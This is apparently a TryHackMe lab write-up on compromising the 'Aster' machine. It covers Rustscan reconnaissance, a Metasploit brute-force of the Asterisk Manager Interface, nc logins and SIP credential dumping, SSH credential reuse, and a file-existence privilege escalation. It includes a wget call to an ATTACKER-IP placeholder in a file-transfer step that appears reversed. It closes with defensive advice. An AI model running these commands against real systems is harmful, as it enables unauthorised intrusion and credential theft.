# 🔴 Aster — TryHackMe Writeup

> **Category:** VoIP Exploitation | Credential Reuse | Reverse Engineering | Privilege Escalation
> **Difficulty:** Medium
> **Status:** Rooted ✅

---

## 📖 Table of Contents

* [Overview](#-overview)
* [Reconnaissance](#-reconnaissance)
* [Service Enumeration](#-service-enumeration)
* [Asterisk Exploitation](#-asterisk-exploitation)
* [Initial Access (SSH)](#-initial-access-ssh)
* [Local Enumeration](#-local-enumeration)
* [Reverse Engineering](#-reverse-engineering)
* [Privilege Escalation](#-privilege-escalation)
* [Attack Chain](#-attack-chain)
* [Lessons Learned](#-lessons-learned)
* [Defensive Recommendations](#-defensive-recommendations)

---

## 🎯 Overview

This machine highlights a **realistic attack path** where an exposed VoIP management service leads to full system compromise.

Instead of exploiting a web app, we abuse:

* Misconfigured **Asterisk Manager Interface (AMI)**
* Weak credentials
* Credential reuse across services
* Insecure custom Java application
* Logic flaw → privilege escalation

> ⚠️ VoIP infrastructure is often ignored during security audits — making it a valuable target.

---

## 🔎 Reconnaissance

We start with fast port discovery using **Rustscan**:

```bash
rustscan -a 10.112.158.188 --ulimit 5000 -- -A -sC
```

### 📡 Open Ports

| Port | Service | Version          |
| ---- | ------- | ---------------- |
| 22   | SSH     | OpenSSH 7.2p2    |
| 80   | HTTP    | Apache 2.4.18    |
| 2000 | SCCP    | Cisco VoIP       |
| 5038 | AMI     | Asterisk Manager |

> 🚨 Port **5038** is the key attack surface.

---

## ☎️ Service Enumeration

Port `5038` exposes **Asterisk Manager Interface (AMI)** — a remote admin API that allows:

* Running system commands
* Managing VoIP users
* Querying configurations

If exposed publicly → extremely dangerous.

---

## 💥 Asterisk Exploitation

Using Metasploit's Asterisk module:

```bash
use auxiliary/voip/asterisk_login
set RHOSTS 10.112.158.188
set RPORT 5038
set USERNAME admin
run
```

### ✅ Credentials Discovered

```
admin : abc123
```

Classic weak/default credentials.

---

## 🔌 Manual Verification

We manually authenticate to AMI:

```bash
nc -nv 10.112.158.188 5038
```

Login:

```
Action: Login
Username: admin
Secret: abc123
```

Access granted ✔️

---

## 🔍 Enumerating VoIP Users

We list SIP users:

```
Action: command
Command: sip show users
```

Output reveals credentials:

```
harry    p4ss#w0rd!#
```

> 💡 VoIP configs often store plaintext secrets.

---

## 🔐 Initial Access (SSH)

We reuse discovered credentials:

```bash
ssh harry@10.112.158.188
```

Password:

```
p4ss#w0rd!#
```

We now have a valid shell.

---

## 📂 Local Enumeration

Inside `/home/harry`:

```
Example_Root.jar
user.txt
```

A custom Java application running on the system is suspicious and likely tied to privilege escalation.

---

## ☕ Reverse Engineering

We transfer the JAR for analysis:

```bash
python3 -m http.server
wget http://ATTACKER-IP/Example_Root.jar
```

After decompiling, we observe the logic:

```java
if (new File("/tmp/flag.dat").exists()) {
    // create root.txt on home
}
```

🚨 The application trusts file existence without validation.

---

## 🚀 Privilege Escalation

We create the expected file:

```bash
touch /tmp/flag.dat
```



Root flag on home dir ✅

---

## 🔗 Attack Chain

```
Exposed AMI Port (5038)
        ↓
Weak Credentials (admin / abc123)
        ↓
AMI Access → SIP Enumeration
        ↓
Credential Disclosure (harry)
        ↓
SSH Login
        ↓
Custom Root-Executed Java App
        ↓
Logic Abuse (/tmp/flag.dat)
        ↓
ROOT ACCESS
```

---

## 🧠 Lessons Learned

✔ Always scan **all ports**, not just HTTP.
✔ VoIP services are commonly misconfigured.
✔ Credentials leak across services more often than expected.
✔ Reverse engineering is an essential privesc skill.
✔ Custom scripts running as root are dangerous if not validated.

---

## 🛡️ Defensive Recommendations

* Restrict AMI access to internal networks.
* Disable default credentials.
* Encrypt or securely store VoIP secrets.
* Apply least privilege to custom applications.
* Monitor VoIP infrastructure like production servers.
* Perform regular configuration audits.

---

## 🏁 Final Thoughts

This machine proves that **real-world compromises rarely require zero-days**.

Most breaches happen due to:

> Misconfiguration + Credential Exposure + Trusting User-Controlled State

---

⭐ If you found this useful, consider starring the repo and sharing with fellow learners.
